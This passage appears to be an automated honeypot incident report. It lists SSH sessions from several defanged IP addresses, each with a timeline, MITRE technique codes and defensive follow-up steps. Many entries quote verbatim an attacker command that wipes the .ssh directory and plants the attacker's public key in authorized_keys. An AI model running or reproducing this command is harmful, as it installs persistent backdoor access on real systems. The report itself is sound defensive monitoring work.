| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:11:52` | `cowrie.session.connect` |
| `2026-05-20 20:11:52` | `cowrie.client.version` |
| `2026-05-20 20:11:52` | `cowrie.client.kex` |
| `2026-05-20 20:11:52` | `cowrie.login.success` |
| `2026-05-20 20:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]19` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-357625b749ca

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:12 |
| **Last Seen** | 2026-05-20 20:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:12:04` | `cowrie.session.connect` |
| `2026-05-20 20:12:05` | `cowrie.client.version` |
| `2026-05-20 20:12:05` | `cowrie.client.kex` |
| `2026-05-20 20:12:05` | `cowrie.login.success` |
| `2026-05-20 20:12:06` | `cowrie.session.params` |
| `2026-05-20 20:12:06` | `cowrie.command.input` |
| `2026-05-20 20:12:06` | `cowrie.command.failed` |
| `2026-05-20 20:12:06` | `cowrie.log.closed` |
| `2026-05-20 20:12:06` | `cowrie.session.params` |
| `2026-05-20 20:12:06` | `cowrie.command.input` |
| `2026-05-20 20:12:07` | `cowrie.session.file_download` |
| `2026-05-20 20:12:07` | `cowrie.log.closed` |
| `2026-05-20 20:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14304b21d296

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:12 |
| **Last Seen** | 2026-05-20 20:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:12:09` | `cowrie.session.connect` |
| `2026-05-20 20:12:09` | `cowrie.client.version` |
| `2026-05-20 20:12:10` | `cowrie.client.kex` |
| `2026-05-20 20:12:11` | `cowrie.login.success` |
| `2026-05-20 20:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce36676cb79

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-05-20 20:16 |
| **Last Seen** | 2026-05-20 20:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:16:33` | `cowrie.session.connect` |
| `2026-05-20 20:16:33` | `cowrie.client.version` |
| `2026-05-20 20:16:33` | `cowrie.client.kex` |
| `2026-05-20 20:16:33` | `cowrie.login.success` |
| `2026-05-20 20:16:34` | `cowrie.session.params` |
| `2026-05-20 20:16:34` | `cowrie.command.input` |
| `2026-05-20 20:16:34` | `cowrie.command.failed` |
| `2026-05-20 20:16:34` | `cowrie.log.closed` |
| `2026-05-20 20:16:34` | `cowrie.session.params` |
| `2026-05-20 20:16:34` | `cowrie.command.input` |
| `2026-05-20 20:16:34` | `cowrie.session.file_download` |
| `2026-05-20 20:16:34` | `cowrie.log.closed` |
| `2026-05-20 20:16:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d0c5af10c80

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-05-20 20:16 |
| **Last Seen** | 2026-05-20 20:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:16:36` | `cowrie.session.connect` |
| `2026-05-20 20:16:36` | `cowrie.client.version` |
| `2026-05-20 20:16:37` | `cowrie.client.kex` |
| `2026-05-20 20:16:37` | `cowrie.login.success` |
| `2026-05-20 20:16:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21327c85e9dc

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-20 20:17 |
| **Last Seen** | 2026-05-20 20:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:17:35` | `cowrie.session.connect` |
| `2026-05-20 20:17:35` | `cowrie.client.version` |
| `2026-05-20 20:17:35` | `cowrie.client.kex` |
| `2026-05-20 20:17:36` | `cowrie.login.success` |
| `2026-05-20 20:17:36` | `cowrie.session.params` |
| `2026-05-20 20:17:36` | `cowrie.command.input` |
| `2026-05-20 20:17:36` | `cowrie.command.failed` |
| `2026-05-20 20:17:36` | `cowrie.log.closed` |
| `2026-05-20 20:17:37` | `cowrie.session.params` |
| `2026-05-20 20:17:37` | `cowrie.command.input` |
| `2026-05-20 20:17:37` | `cowrie.session.file_download` |
| `2026-05-20 20:17:37` | `cowrie.log.closed` |
| `2026-05-20 20:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9414880a1d70

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-20 20:17 |
| **Last Seen** | 2026-05-20 20:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:17:39` | `cowrie.session.connect` |
| `2026-05-20 20:17:39` | `cowrie.client.version` |
| `2026-05-20 20:17:39` | `cowrie.client.kex` |
| `2026-05-20 20:17:39` | `cowrie.login.success` |
| `2026-05-20 20:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-970d56869c49

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:17 |
| **Last Seen** | 2026-05-20 20:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:17:48` | `cowrie.session.connect` |
| `2026-05-20 20:17:48` | `cowrie.client.version` |
| `2026-05-20 20:17:48` | `cowrie.client.kex` |
| `2026-05-20 20:17:49` | `cowrie.login.success` |
| `2026-05-20 20:17:50` | `cowrie.session.params` |
| `2026-05-20 20:17:50` | `cowrie.command.input` |
| `2026-05-20 20:17:50` | `cowrie.command.failed` |
| `2026-05-20 20:17:50` | `cowrie.log.closed` |
| `2026-05-20 20:17:50` | `cowrie.session.params` |
| `2026-05-20 20:17:50` | `cowrie.command.input` |
| `2026-05-20 20:17:51` | `cowrie.session.file_download` |
| `2026-05-20 20:17:51` | `cowrie.log.closed` |
| `2026-05-20 20:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43bdae895207

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:17 |
| **Last Seen** | 2026-05-20 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:17:54` | `cowrie.session.connect` |
| `2026-05-20 20:17:54` | `cowrie.client.version` |
| `2026-05-20 20:17:54` | `cowrie.client.kex` |
| `2026-05-20 20:17:55` | `cowrie.login.success` |
| `2026-05-20 20:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3002c01a5adf

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-05-20 20:18 |
| **Last Seen** | 2026-05-20 20:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:18:52` | `cowrie.session.connect` |
| `2026-05-20 20:18:52` | `cowrie.client.version` |
| `2026-05-20 20:18:52` | `cowrie.client.kex` |
| `2026-05-20 20:18:53` | `cowrie.login.success` |
| `2026-05-20 20:18:53` | `cowrie.session.params` |
| `2026-05-20 20:18:53` | `cowrie.command.input` |
| `2026-05-20 20:18:53` | `cowrie.command.failed` |
| `2026-05-20 20:18:53` | `cowrie.log.closed` |
| `2026-05-20 20:18:53` | `cowrie.session.params` |
| `2026-05-20 20:18:53` | `cowrie.command.input` |
| `2026-05-20 20:18:53` | `cowrie.session.file_download` |
| `2026-05-20 20:18:53` | `cowrie.log.closed` |
| `2026-05-20 20:18:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4109600b1699

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-05-20 20:18 |
| **Last Seen** | 2026-05-20 20:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:18:56` | `cowrie.session.connect` |
| `2026-05-20 20:18:56` | `cowrie.client.version` |
| `2026-05-20 20:18:56` | `cowrie.client.kex` |
| `2026-05-20 20:18:56` | `cowrie.login.success` |
| `2026-05-20 20:18:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26e39178836f

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:19 |
| **Last Seen** | 2026-05-20 20:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:19:37` | `cowrie.session.connect` |
| `2026-05-20 20:19:37` | `cowrie.client.version` |
| `2026-05-20 20:19:37` | `cowrie.client.kex` |
| `2026-05-20 20:19:38` | `cowrie.login.success` |
| `2026-05-20 20:19:39` | `cowrie.session.params` |
| `2026-05-20 20:19:39` | `cowrie.command.input` |
| `2026-05-20 20:19:39` | `cowrie.command.failed` |
| `2026-05-20 20:19:39` | `cowrie.log.closed` |
| `2026-05-20 20:19:39` | `cowrie.session.params` |
| `2026-05-20 20:19:39` | `cowrie.command.input` |
| `2026-05-20 20:19:39` | `cowrie.session.file_download` |
| `2026-05-20 20:19:39` | `cowrie.log.closed` |
| `2026-05-20 20:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b9fad9ca20a

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:19 |
| **Last Seen** | 2026-05-20 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:19:42` | `cowrie.session.connect` |
| `2026-05-20 20:19:42` | `cowrie.client.version` |
| `2026-05-20 20:19:43` | `cowrie.client.kex` |
| `2026-05-20 20:19:44` | `cowrie.login.success` |
| `2026-05-20 20:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92760738b0a8

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:19 |
| **Last Seen** | 2026-05-20 20:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:19:44` | `cowrie.session.connect` |
| `2026-05-20 20:19:44` | `cowrie.client.version` |
| `2026-05-20 20:19:44` | `cowrie.client.kex` |
| `2026-05-20 20:19:45` | `cowrie.login.success` |
| `2026-05-20 20:19:45` | `cowrie.session.params` |
| `2026-05-20 20:19:45` | `cowrie.command.input` |
| `2026-05-20 20:19:45` | `cowrie.command.failed` |
| `2026-05-20 20:19:45` | `cowrie.log.closed` |
| `2026-05-20 20:19:46` | `cowrie.session.params` |
| `2026-05-20 20:19:46` | `cowrie.command.input` |
| `2026-05-20 20:19:46` | `cowrie.session.file_download` |
| `2026-05-20 20:19:46` | `cowrie.log.closed` |
| `2026-05-20 20:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00412b48115f

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:19 |
| **Last Seen** | 2026-05-20 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:19:49` | `cowrie.session.connect` |
| `2026-05-20 20:19:49` | `cowrie.client.version` |
| `2026-05-20 20:19:50` | `cowrie.client.kex` |
| `2026-05-20 20:19:50` | `cowrie.login.success` |
| `2026-05-20 20:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4295bec481db

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-05-20 20:19 |
| **Last Seen** | 2026-05-20 20:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:19:58` | `cowrie.session.connect` |
| `2026-05-20 20:19:58` | `cowrie.client.version` |
| `2026-05-20 20:19:58` | `cowrie.client.kex` |
| `2026-05-20 20:19:59` | `cowrie.login.success` |
| `2026-05-20 20:19:59` | `cowrie.session.params` |
| `2026-05-20 20:19:59` | `cowrie.command.input` |
| `2026-05-20 20:19:59` | `cowrie.command.failed` |
| `2026-05-20 20:19:59` | `cowrie.log.closed` |
| `2026-05-20 20:19:59` | `cowrie.session.params` |
| `2026-05-20 20:19:59` | `cowrie.command.input` |
| `2026-05-20 20:20:00` | `cowrie.session.file_download` |
| `2026-05-20 20:20:00` | `cowrie.log.closed` |
| `2026-05-20 20:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c08c8c403130

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-05-20 20:20 |
| **Last Seen** | 2026-05-20 20:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:20:02` | `cowrie.session.connect` |
| `2026-05-20 20:20:02` | `cowrie.client.version` |
| `2026-05-20 20:20:02` | `cowrie.client.kex` |
| `2026-05-20 20:20:02` | `cowrie.login.success` |
| `2026-05-20 20:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b57e7f749c6b

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:21 |
| **Last Seen** | 2026-05-20 20:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
